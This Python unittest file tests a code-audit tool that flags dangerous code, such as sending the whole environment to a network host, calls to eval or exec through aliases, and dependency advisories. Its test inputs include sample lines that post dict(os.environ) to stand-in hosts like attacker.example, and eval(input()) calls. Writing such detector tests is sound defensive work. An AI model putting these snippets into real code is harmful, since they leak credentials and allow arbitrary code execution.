import io
import shutil
import unittest
import zipfile
from unittest.mock import patch
import main
from flow_review import supplemental_flows


class AuditTrustTests(unittest.TestCase):
    def test_environment_containers_reach_network_with_evidence(self):
        for expression in ['dict(os.environ)', 'os.environ.copy()', '{"diagnostics": dict(os.environ)}', 'list(os.environ.items())']:
            code=f'import os, requests\npayload = {expression}\nrequests.post("https://collector.example/ingest", json=payload)'
            with self.subTest(expression=expression):
                r=main.analyze_code('Do not transmit credentials',code)
                f=next(f for f in r['flags'] if f['pattern']=='whole_environment_egress')
                self.assertGreaterEqual(f['severity'],18)
                self.assertIn('collector.example',f['explanation'])
                self.assertEqual(r['risk'],'red')

    def test_selected_nonsecret_config_and_local_environment_are_not_exfiltration(self):
        for code in ['import os\npayload=dict(os.environ)', 'import os,requests\nrequests.post("https://api.example",json={"count":len(os.environ)})', 'import os,requests\nrequests.post("https://api.example",json=list(os.environ))', 'import os,requests\nrequests.post("https://api.example",json={"home":os.environ["HOME"]})', 'import os,requests\npayload=dict(os.environ)\npayload={"ok":True}\nrequests.post("https://api.example",json=payload)', 'import os,requests\nrequests.post("https://api.example",json=list(os.environ.keys()))']:
            self.assertFalse(supplemental_flows(code),code)

    def test_alias_chain_reassignment_and_function_scopes(self):
        for code in ['runner=eval\nrunner(input())','runner=exec\nsecond=runner\nsecond(input())','from builtins import eval as runner\nrunner(input())','def run(value):\n runner=eval\n runner(value)']:
            self.assertTrue(any(f['severity']>=18 for f in supplemental_flows(code)),code)
        for code in ['runner=eval\nrunner=print\nrunner(input())','runner=eval\ndef run(runner):\n runner(input())','def one():\n runner=eval\ndef two(runner):\n runner(input())']:
            self.assertFalse(supplemental_flows(code),code)

    def test_comment_padding_never_increases_confidence(self):
        engine={'status':'complete','findings':[]}
        with patch.object(main,'run_semgrep_scan',return_value=engine):
            a=main.analyze_code_product('Set value','x=1',language='Python')
            b=main.analyze_code_product('Set value','x=1\n'+'# padding\n'*50,language='Python')
        self.assertEqual(a['scan_confidence'],b['scan_confidence'])
        self.assertEqual(a['scan_confidence']['level'],'Not calibrated')
        self.assertEqual(main.build_scan_confidence('repo',files_scanned_count=50,files_total=50)['level'],'Not calibrated')

    def test_partial_batch_retains_previous_advisory_and_query_count(self):
        archive=io.BytesIO()
        with zipfile.ZipFile(archive,'w') as z:z.writestr('requirements.txt','requests==2.0.0\nurllib3==1.0.0')
        archive.seek(0)
        with zipfile.ZipFile(archive) as z, patch.object(main,'OSV_BATCH_SIZE',1), patch.object(main,'fetch_json',side_effect=[{'results':[{'vulns':[{'id':'TEST-1'}]}]},ValueError('failed')]), patch.object(main,'fetch_osv_vulnerability',return_value={'id':'TEST-1','summary':'Retained advisory'}):
            r=main.analyze_dependency_manifests(z)
        self.assertEqual(r['dependencies_queried'],1)
        self.assertTrue(r['dependency_scan_error'])
        self.assertIn('TEST-1',[f.get('id') for f in r['dependency_findings']])

    @unittest.skipUnless(shutil.which('semgrep'),'Full-engine regression requires installed Semgrep')
    def test_full_pipeline_new_misses_and_constant_false_positive(self):
        cases=[('import os,requests\nrequests.post("https://attacker.example/collect",json=dict(os.environ))',True),('runner=eval\nrunner(input())',True),('eval(input())',True),('eval("__import__(\'os\').system(\'echo test\')")',True),('eval("2+2")',False)]
        for code,dangerous in cases:
            with self.subTest(code=code):
                r=main.analyze_code_product('Process locally',code,language='Python')
                self.assertEqual(r['scan_status'],'complete')
                self.assertEqual(r['verdict']['id']=='do_not_run',dangerous)
                if not dangerous:
                    self.assertTrue(r['engine_findings'])
                    self.assertTrue(all(f['severity']<8 for f in r['engine_findings']))
